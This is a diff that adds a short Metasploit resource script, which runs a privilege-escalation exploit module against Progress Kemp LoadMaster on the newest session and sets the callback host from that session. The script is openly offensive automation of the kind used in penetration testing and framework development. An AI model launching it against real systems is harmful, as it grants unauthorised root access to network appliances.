@@ -1,0 +1,8 @@
+<ruby>
+print_status("Running Progress Kemp Loadmaster sudo Privilege Escalation")
+run_single("use modules/exploits/linux/local/progress_kemp_loadmaster_sudo_privesc_2024")
+run_single("set session -1")
+session_lhost = framework.sessions[framework.sessions.keys.last].tunnel_local.split(':')[0..-2].join(':')
+run_single("set lhost #{session_lhost}")
+run_single("run")
+</ruby>
